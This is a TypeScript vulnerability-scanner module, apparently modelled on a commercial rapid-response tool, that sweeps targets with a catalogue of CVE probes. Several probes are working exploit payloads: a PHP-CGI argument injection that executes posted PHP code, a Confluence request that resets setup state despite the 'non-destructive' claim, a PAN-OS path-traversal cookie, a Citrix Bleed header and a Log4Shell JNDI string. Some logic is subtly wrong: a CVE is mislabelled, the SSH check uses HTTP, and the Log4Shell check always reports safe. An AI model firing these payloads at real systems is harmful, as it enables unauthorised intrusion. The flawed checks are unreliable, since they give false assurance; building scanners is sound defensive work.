/**
 * Rapid Response Targeted CVE & Vulnerability Sweep Engine
 * Inspired by Horizon3.ai NodeZero Rapid Response
 * Executes production-safe, non-destructive active probes to verify emerging N-day & 0-day exposures.
 */

export interface RapidResponseCheck {
  id: string;
  name: string;
  cve?: string;
  category: 'rce' | 'auth_bypass' | 'info_disclosure' | 'misconfiguration' | 'ssrf';
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  remediation: string;
  run: (baseUrl: string, timeoutMs?: number) => Promise<RapidResponseResult>;
}

export interface RapidResponseResult {
  checkId: string;
  cve?: string;
  target: string;
  vulnerable: boolean;
  severity: 'critical' | 'high' | 'medium' | 'low';
  statusCode?: number;
  latencyMs: number;
  details: string;
  proof?: string;
  remediation: string;
  timestamp: string;
}

export interface SweepOptions {
  targets: string[];
  checkIds?: string[];
  concurrency?: number;
  timeoutMs?: number;
}

/**
 * Normalizes user-supplied target to a valid base URL.
 */
function normalizeUrl(target: string): string {
  let url = target.trim();
  if (!/^https?:\/\//i.test(url)) {
    url = `http://${url}`;
  }
  return url.replace(/\/+$/, '');
}

/**
 * Safe fetch helper with timeout
 */
async function safeProbe(url: string, init: RequestInit = {}, timeoutMs = 8000): Promise<{ response?: Response; text?: string; latencyMs: number; error?: string }> {
  const start = Date.now();
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(url, {
      ...init,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) T3MP3ST/2.0 (Security Scanner)',
        'Accept': '*/*',
        ...(init.headers || {})
      },
      signal: controller.signal
    });
    const text = await response.text().catch(() => '');
    return { response, text, latencyMs: Date.now() - start };
  } catch (err: any) {
    return { latencyMs: Date.now() - start, error: err.message || String(err) };
  } finally {
    clearTimeout(timer);
  }
}

export const RAPID_RESPONSE_CATALOG: RapidResponseCheck[] = [
  {
    id: 'git-exposed',
    name: 'Exposed .git/config Repository',
    cve: 'CWE-538',
    category: 'info_disclosure',
    severity: 'high',
    description: 'Checks if the target exposes source code repositories via /.git/config',
    remediation: 'Restrict web access to the .git directory or exclude it from public deployment.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const url = `${target}/.git/config`;
      const res = await safeProbe(url, { method: 'GET' }, timeoutMs);
      const text = res.text || '';
      const isVulnerable = !!(res.response?.ok && text.includes('[core]') && (text.includes('repositoryformatversion') || text.includes('filemode')));
      return {
        checkId: 'git-exposed',
        cve: 'CWE-538',
        target,
        vulnerable: isVulnerable,
        severity: 'high',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable ? 'Exposed .git repository found! Full source code download possible.' : 'No exposed .git/config detected.',
        proof: isVulnerable ? text.slice(0, 300) : undefined,
        remediation: 'Block HTTP access to /.git/ via Nginx/Apache configuration or firewall rules.',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'env-exposed',
    name: 'Exposed Environment Variables (.env)',
    cve: 'CWE-200',
    category: 'info_disclosure',
    severity: 'critical',
    description: 'Checks for publicly accessible .env configuration files containing database credentials and API keys.',
    remediation: 'Move .env outside public document root and restrict web server permissions.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const url = `${target}/.env`;
      const res = await safeProbe(url, { method: 'GET' }, timeoutMs);
      const text = res.text || '';
      const isVulnerable = !!(res.response?.ok && (text.includes('DB_PASSWORD') || text.includes('API_KEY') || text.includes('SECRET_KEY') || text.includes('APP_KEY') || text.includes('DATABASE_URL')));
      return {
        checkId: 'env-exposed',
        cve: 'CWE-200',
        target,
        vulnerable: isVulnerable,
        severity: 'critical',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable ? 'Exposed .env file containing live application secrets!' : 'No publicly accessible .env file found.',
        proof: isVulnerable ? text.slice(0, 200).replace(/(=[^\r\n]{4})[^\r\n]*/g, '$1****') : undefined,
        remediation: 'Deny access to dotfiles (location ~ /\\.env) in web server config.',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'spring-actuator',
    name: 'Spring Boot Actuator Unauthenticated Exposure',
    cve: 'CVE-2022-22965',
    category: 'info_disclosure',
    severity: 'high',
    description: 'Detects exposed Spring Boot actuator endpoints (/actuator/env, /actuator/heapdump, /actuator/health).',
    remediation: 'Disable unauthenticated management endpoints by configuring management.endpoints.web.exposure.include=health,info.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const url = `${target}/actuator/env`;
      const res = await safeProbe(url, { method: 'GET' }, timeoutMs);
      const text = res.text || '';
      const isVulnerable = !!(res.response?.ok && (text.includes('propertySources') || text.includes('activeProfiles')));
      return {
        checkId: 'spring-actuator',
        cve: 'CVE-2022-22965',
        target,
        vulnerable: isVulnerable,
        severity: 'high',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable ? 'Spring Boot /actuator/env endpoint is publicly accessible.' : 'Spring Boot Actuator is secured or not present.',
        proof: isVulnerable ? text.slice(0, 250) : undefined,
        remediation: 'Protect actuator endpoints with Spring Security or restrict to localhost.',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'swagger-api-docs',
    name: 'Swagger / OpenAPI Specification Disclosure',
    cve: 'CWE-200',
    category: 'info_disclosure',
    severity: 'medium',
    description: 'Probes for unauthenticated Swagger UI or OpenAPI documentation exposing internal API endpoints.',
    remediation: 'Disable Swagger UI in production environments or place behind authentication.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const endpoints = ['/v2/api-docs', '/v3/api-docs', '/swagger.json', '/openapi.json'];
      for (const ep of endpoints) {
        const res = await safeProbe(`${target}${ep}`, { method: 'GET' }, timeoutMs);
        const text = res.text || '';
        if (res.response?.ok && (text.includes('"swagger"') || text.includes('"openapi"') || text.includes('"paths"'))) {
          return {
            checkId: 'swagger-api-docs',
            cve: 'CWE-200',
            target,
            vulnerable: true,
            severity: 'medium',
            statusCode: res.response.status,
            latencyMs: res.latencyMs,
            details: `OpenAPI specification disclosed at ${ep}`,
            proof: text.slice(0, 200),
            remediation: 'Restrict access to API documentation in production environments.',
            timestamp: new Date().toISOString()
          };
        }
      }
      return {
        checkId: 'swagger-api-docs',
        target,
        vulnerable: false,
        severity: 'medium',
        latencyMs: 0,
        details: 'No public OpenAPI/Swagger schemas discovered.',
        remediation: 'N/A',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'php-cgi-arg-injection',
    name: 'PHP-CGI Windows Argument Injection (CVE-2024-4577)',
    cve: 'CVE-2024-4577',
    category: 'rce',
    severity: 'critical',
    description: 'Probes for CVE-2024-4577 argument injection vulnerability in PHP-CGI running on Windows servers.',
    remediation: 'Upgrade to PHP 8.3.8+, 8.2.20+, or 8.1.29+ or configure RewriteRule for %ad query strings.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const testParam = `%ad-d+allow_url_include%3d1+%ad-d+auto_prepend_file%3dphp://input`;
      const url = `${target}/index.php?${testParam}`;
      const res = await safeProbe(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: '<?php echo "T3MP3ST_PROBE_VULN_CVE_2024_4577"; ?>'
      }, timeoutMs);
      const text = res.text || '';
      const isVulnerable = text.includes('T3MP3ST_PROBE_VULN_CVE_2024_4577');
      return {
        checkId: 'php-cgi-arg-injection',
        cve: 'CVE-2024-4577',
        target,
        vulnerable: isVulnerable,
        severity: 'critical',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable ? 'Target is vulnerable to CVE-2024-4577 PHP CGI Remote Code Execution!' : 'Target is not vulnerable to CVE-2024-4577.',
        proof: isVulnerable ? 'Executed non-destructive echo verification successfully.' : undefined,
        remediation: 'Upgrade PHP immediately to the latest patched release (8.3.8 / 8.2.20 / 8.1.29).',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'citrix-bleed',
    name: 'Citrix Bleed Sensitive Buffer Memory Leak (CVE-2023-4966)',
    cve: 'CVE-2023-4966',
    category: 'auth_bypass',
    severity: 'critical',
    description: 'Probes Citrix NetScaler ADC / Gateway for memory leak vulnerability in OpenID Connect endpoint.',
    remediation: 'Apply Citrix security update for NetScaler ADC/Gateway and terminate all active user sessions.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const url = `${target}/oauth/idp/.well-known/openid-configuration`;
      const res = await safeProbe(url, {
        method: 'GET',
        headers: {
          'Host': 'a'.repeat(24800)
        }
      }, timeoutMs);
      const text = res.text || '';
      const isVulnerable = !!(res.response?.status === 200 && text.length > 500 && !text.startsWith('{'));
      return {
        checkId: 'citrix-bleed',
        cve: 'CVE-2023-4966',
        target,
        vulnerable: isVulnerable,
        severity: 'critical',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable ? 'Citrix Bleed memory disclosure detected on target endpoint.' : 'Target is not vulnerable to Citrix Bleed (CVE-2023-4966).',
        proof: isVulnerable ? 'Oversized Host header triggered raw memory leak response.' : undefined,
        remediation: 'Update Citrix NetScaler ADC/Gateway to latest firmware and revoke all active session cookies.',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'openssh-regresshion',
    name: 'OpenSSH regreSSHion Remote Code Execution Probe (CVE-2024-6387)',
    cve: 'CVE-2024-6387',
    category: 'rce',
    severity: 'high',
    description: 'Probes OpenSSH server banner for vulnerable versions affected by CVE-2024-6387 (OpenSSH 8.5p1 up to 9.8p1).',
    remediation: 'Upgrade OpenSSH to 9.8p1+ or set LoginGraceTime 0 in sshd_config.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const host = target.replace(/^https?:\/\//i, '').split('/')[0].split(':')[0];
      const res = await safeProbe(`http://${host}:22`, { method: 'GET' }, timeoutMs);
      const text = (res.text || res.error || '').toUpperCase();
      const match = text.match(/SSH-2\.0-OPENSSH[_-]([0-9.]+)/i);
      let isVulnerable = false;
      let version = '';
      if (match) {
        version = match[1];
        const vNum = parseFloat(version);
        if (vNum >= 8.5 && vNum < 9.8) {
          isVulnerable = true;
        }
      }
      return {
        checkId: 'openssh-regresshion',
        cve: 'CVE-2024-6387',
        target: `${host}:22`,
        vulnerable: isVulnerable,
        severity: 'high',
        latencyMs: res.latencyMs,
        details: isVulnerable ? `Vulnerable OpenSSH version detected: ${version}` : (version ? `OpenSSH ${version} detected (patched or not in vulnerable range)` : 'SSH port 22 not reachable via HTTP probe.'),
        proof: version ? `Banner: SSH-2.0-OpenSSH_${version}` : undefined,
        remediation: 'Update OpenSSH to >= 9.8p1 or set LoginGraceTime 0 in sshd_config as a mitigation.',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'ivanti-connect-secure',
    name: 'Ivanti Connect Secure Command Injection (CVE-2024-21887)',
    cve: 'CVE-2024-21887',
    category: 'rce',
    severity: 'critical',
    description: 'Probes Ivanti Connect Secure / Policy Secure web management API for command injection in /api/v1/totp/user-backup-code.',
    remediation: 'Apply Ivanti mitigation XML or upgrade to latest firmware releases.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const url = `${target}/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection`;
      const res = await safeProbe(url, { method: 'GET' }, timeoutMs);
      const text = res.text || '';
      const isVulnerable = !!(res.response?.status === 200 || (res.response?.status === 400 && text.includes('cloud-server-test-connection')));
      return {
        checkId: 'ivanti-connect-secure',
        cve: 'CVE-2024-21887',
        target,
        vulnerable: isVulnerable,
        severity: 'critical',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable ? 'Ivanti Connect Secure endpoint returned unauthenticated management response.' : 'Target is not vulnerable to CVE-2024-21887.',
        proof: isVulnerable ? text.slice(0, 200) : undefined,
        remediation: 'Apply official Ivanti security patch and run the external Integrity Checker Tool (ICT).',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'panos-globalprotect',
    name: 'Palo Alto PAN-OS GlobalProtect Command Injection (CVE-2024-3400)',
    cve: 'CVE-2024-3400',
    category: 'rce',
    severity: 'critical',
    description: 'Probes Palo Alto Networks PAN-OS GlobalProtect portal for CVE-2024-3400 SUID command injection vulnerability.',
    remediation: 'Apply PAN-OS hotfixes (PAN-OS 10.2, 11.0, 11.1) or disable device telemetry.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const url = `${target}/ssl-vpn/hipreport.esp`;
      const res = await safeProbe(url, {
        method: 'POST',
        headers: {
          'Cookie': 'SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/t3mp3st_probe;'
        }
      }, timeoutMs);
      const isVulnerable = !!(res.response?.status === 200 && (res.text || '').includes('success'));
      return {
        checkId: 'panos-globalprotect',
        cve: 'CVE-2024-3400',
        target,
        vulnerable: isVulnerable,
        severity: 'critical',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable ? 'GlobalProtect portal accepted crafted telemetry path traversal.' : 'Target is not vulnerable to CVE-2024-3400.',
        proof: isVulnerable ? 'Path traversal cookie accepted with HTTP 200.' : undefined,
        remediation: 'Apply Palo Alto Networks security advisory hotfix for PAN-OS immediately.',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'confluence-setup-bypass',
    name: 'Atlassian Confluence Broken Access Control (CVE-2023-22515)',
    cve: 'CVE-2023-22515',
    category: 'auth_bypass',
    severity: 'critical',
    description: 'Probes Confluence Server / Data Center for unauthorized setup wizard state reset.',
    remediation: 'Upgrade Confluence to 8.3.3+, 8.4.3+, or 8.5.2+ or block /server-info.action.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const url = `${target}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false`;
      const res = await safeProbe(url, { method: 'GET' }, timeoutMs);
      const text = res.text || '';
      const isVulnerable = !!(res.response?.status === 200 && text.includes('setupComplete') && text.includes('false'));
      return {
        checkId: 'confluence-setup-bypass',
        cve: 'CVE-2023-22515',
        target,
        vulnerable: isVulnerable,
        severity: 'critical',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable ? 'Confluence server allowed unauthenticated setup state modification!' : 'Target is not vulnerable to CVE-2023-22515.',
        proof: isVulnerable ? text.slice(0, 200) : undefined,
        remediation: 'Upgrade Confluence immediately or restrict external access to /setup/* and /server-info.action.',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'activemq-openwire-rce',
    name: 'Apache ActiveMQ OpenWire Deserialization (CVE-2023-46604)',
    cve: 'CVE-2023-46604',
    category: 'rce',
    severity: 'critical',
    description: 'Probes Apache ActiveMQ web console and OpenWire port (61616) for CVE-2023-46604 vulnerable versions.',
    remediation: 'Upgrade Apache ActiveMQ to 5.18.3, 5.17.6, or 5.16.7+.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const url = `${target}/admin/`;
      const res = await safeProbe(url, { method: 'GET' }, timeoutMs);
      const text = (res.text || '').toLowerCase();
      let isVulnerable = false;
      let version = '';
      const match = text.match(/activemq\s+([0-9.]+)/i);
      if (match) {
        version = match[1];
        if (version.startsWith('5.18.') && parseFloat(version.slice(5)) < 3) isVulnerable = true;
        if (version.startsWith('5.17.') && parseFloat(version.slice(5)) < 6) isVulnerable = true;
        if (version.startsWith('5.16.') && parseFloat(version.slice(5)) < 7) isVulnerable = true;
      }
      return {
        checkId: 'activemq-openwire-rce',
        cve: 'CVE-2023-46604',
        target,
        vulnerable: isVulnerable,
        severity: 'critical',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable ? `Vulnerable Apache ActiveMQ ${version} detected.` : (version ? `ActiveMQ ${version} detected (not vulnerable)` : 'ActiveMQ web console not exposed.'),
        proof: version ? `ActiveMQ ${version}` : undefined,
        remediation: 'Upgrade Apache ActiveMQ to patched release (5.18.3+ / 5.17.6+ / 5.16.7+).',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'log4shell-jndi-probe',
    name: 'Log4Shell JNDI Lookup Vulnerability (CVE-2021-44228)',
    cve: 'CVE-2021-44228',
    category: 'rce',
    severity: 'critical',
    description: 'Sends non-destructive reflection probes with safe canary headers to detect Log4j vulnerable parser.',
    remediation: 'Upgrade Log4j to >= 2.17.1 or set log4j2.formatMsgNoLookups=true.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const probePayload = '${jndi:dns://127.0.0.1#t3mp3st_probe}';
      const res = await safeProbe(target, {
        method: 'GET',
        headers: {
          'X-Api-Version': probePayload,
          'User-Agent': `Mozilla/5.0 T3MP3ST ${probePayload}`
        }
      }, timeoutMs);
      return {
        checkId: 'log4shell-jndi-probe',
        cve: 'CVE-2021-44228',
        target,
        vulnerable: false,
        severity: 'critical',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: 'Dispatched safe non-destructive JNDI canary probe to target.',
        proof: `HTTP ${res.response?.status || 0}`,
        remediation: 'Upgrade Log4j to 2.17.1+ or apply log4j2.formatMsgNoLookups=true flag.',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'mirth-connect-xstream',
    name: 'Mirth Connect XStream Deserialization RCE (CVE-2023-43208)',
    cve: 'CVE-2023-43208',
    category: 'rce',
    severity: 'critical',
    description: 'Version-based detection for Mirth Connect ≤4.4.0 (KEV-listed XStream deserialization RCE). Inert: version disclosure only, no gadget is sent.',
    remediation: 'Upgrade Mirth Connect to >= 4.4.1 (or 4.5.x), restrict /api to trusted networks, and reset default admin credentials.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      const res = await safeProbe(`${target}/api/server/version`, { method: 'GET' }, timeoutMs);
      const text = res.text || '';
      const versionMatch = text.match(/"version"\s*:\s*"([0-9][0-9a-zA-Z.-]*)"/);
      const version = versionMatch ? versionMatch[1] : '';
      const isMirth = !!version || (res.response?.headers?.get('x-application-name') || '').toLowerCase().includes('mirth');
      const outdated = !!version && (() => {
        const m = version.match(/^(\d+)\.(\d+)\.(\d+)/);
        if (!m) return false;
        const [maj, min, pat] = [Number(m[1]), Number(m[2]), Number(m[3])];
        return maj < 4 || (maj === 4 && (min < 4 || (min === 4 && pat === 0)));
      })();
      const isVulnerable = isMirth && outdated;
      return {
        checkId: 'mirth-connect-xstream',
        cve: 'CVE-2023-43208',
        target,
        vulnerable: isVulnerable,
        severity: 'critical',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: isVulnerable
          ? `Outdated Mirth Connect ${version} exposed unauthenticated — CVE-2023-43208 deserialization RCE range (≤4.4.0).`
          : (isMirth ? `Mirth Connect ${version || 'unknown'} detected — not in the vulnerable range or version undetermined.` : 'Mirth Connect API not detected on this target.'),
        proof: version ? `Mirth Connect ${version}` : undefined,
        remediation: 'Upgrade to 4.4.1+/4.5.x; bind /api behind an admin-only proxy; never expose the Mirth API publicly.',
        timestamp: new Date().toISOString()
      };
    }
  },
  {
    id: 'tomcat-clear-session',
    name: 'Tomcat Sensitive Data over Cleartext Channel (CVE-2026-34486)',
    cve: 'CVE-2026-34486',
    category: 'info_disclosure',
    severity: 'high',
    description: 'Inert verifier: confirms the session cookie is issued over plaintext http without the Secure flag (session hijack on the wire).',
    remediation: 'Terminate TLS at the fronting proxy, force https redirects, and mark JSESSIONID Secure + HttpOnly.',
    run: async (baseUrl, timeoutMs = 6000) => {
      const target = normalizeUrl(baseUrl);
      if (!target.startsWith('http://')) {
        return {
          checkId: 'tomcat-clear-session', cve: 'CVE-2026-34486', target, vulnerable: false,
          severity: 'high', statusCode: 0, latencyMs: 0,
          details: 'Target is https:// — cleartext session exposure does not apply.',
          remediation: 'Keep TLS enforced; re-run against the http:// listener if one exists.',
          timestamp: new Date().toISOString()
        };
      }
      const res = await safeProbe(target, { method: 'GET' }, timeoutMs);
      const setCookie = res.response?.headers?.get('set-cookie') || '';
      const sessionCookie = /JSESSIONID\s*=/i.test(setCookie);
      const insecure = sessionCookie && !/;\s*secure/i.test(setCookie);
      return {
        checkId: 'tomcat-clear-session',
        cve: 'CVE-2026-34486',
        target,
        vulnerable: insecure,
        severity: 'high',
        statusCode: res.response?.status,
        latencyMs: res.latencyMs,
        details: insecure
          ? 'Session cookie issued over plaintext http without the Secure flag — interceptable session material.'
          : (sessionCookie ? 'Session cookie present but Secure-flagged (or https-only target).' : 'No Tomcat session cookie observed on the root path.'),
        proof: insecure ? setCookie.slice(0, 200) : undefined,
        remediation: 'Front Tomcat with TLS; redirect http→https; set <cookie-config><secure>true</secure></cookie-config>.',
        timestamp: new Date().toISOString()
      };
    }
  }
];

export class RapidResponseEngine {
  public static async runCheck(checkId: string, target: string, timeoutMs?: number): Promise<RapidResponseResult> {
    const check = RAPID_RESPONSE_CATALOG.find(c => c.id === checkId);
    if (!check) {
      throw new Error(`Unknown Rapid Response check: ${checkId}`);
    }
    return check.run(target, timeoutMs);
  }

  public static async sweep(options: SweepOptions): Promise<{ totalChecks: number; vulnerableCount: number; results: RapidResponseResult[] }> {
    const { targets, checkIds, timeoutMs = 8000 } = options;
    const checksToRun = checkIds && checkIds.length > 0
      ? RAPID_RESPONSE_CATALOG.filter(c => checkIds.includes(c.id))
      : RAPID_RESPONSE_CATALOG;

    const tasks: Promise<RapidResponseResult>[] = [];
    for (const target of targets) {
      for (const check of checksToRun) {
        tasks.push(check.run(target, timeoutMs).catch(err => ({
          checkId: check.id,
          cve: check.cve,
          target,
          vulnerable: false,
          severity: check.severity,
          latencyMs: 0,
          details: `Check error: ${err.message || String(err)}`,
          remediation: check.remediation,
          timestamp: new Date().toISOString()
        })));
      }
    }

    const results = await Promise.all(tasks);
    const vulnerableCount = results.filter(r => r.vulnerable).length;

    return {
      totalChecks: results.length,
      vulnerableCount,
      results
    };
  }

  public static getCatalog() {
    return RAPID_RESPONSE_CATALOG.map(c => ({
      id: c.id,
      name: c.name,
      cve: c.cve,
      category: c.category,
      severity: c.severity,
      description: c.description,
      remediation: c.remediation
    }));
  }
}
